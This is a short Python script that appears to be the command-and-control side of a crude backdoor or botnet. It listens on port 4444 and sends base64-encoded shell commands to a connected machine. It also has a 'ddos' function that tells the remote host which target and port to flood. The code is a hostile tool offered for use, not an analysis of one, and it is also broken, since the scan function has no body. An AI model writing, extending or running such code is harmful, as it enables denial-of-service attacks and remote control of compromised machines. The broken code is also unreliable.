#! usr/bin/env python
#Libs
import socket
import os
import base64
from datetime import datetime

#Conexao & Bind Server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Conexao IPV4 TCP
s.bind(('', 4444)) #Aguardando Conexao '127.0.0.1'
s.listen(10) #Quantidade de Conexoes
conn, addr = s.accept()

#Crypt & Decrypt
def encode(strings):
	return base64.b64encode(strings)
def decode(strings):
	return base64.b64decode(strings)

#Tempo
T1 = datetime.now()

#Funtions
def scan():


def ddos():
	Alvo = str(input("Target:"))
	conn.send(Alvo)
	Porta = str(input("Port:"))
	conn.send(Porta)
	print ('Ataque Iniciado:{}'.format(T1))
	data = decode(conn.recv(1024))
	T2 = datetime.now()
	tempo = T2 - T1
	print ("Tempo Gasto: {}".format(tempo))

#Main
def main():
	while True:
		command = str(input("Shell:"))
		if 'upgrade' == command:
			os.system("apt-get -y upgrade && apt-get update -y")
		elif 'scan' == command:
			scan()
		elif 'ddos' == command:
			ddos()

		output = encode(command)
		conn.send(output)

#Client
def client():
	main()
client()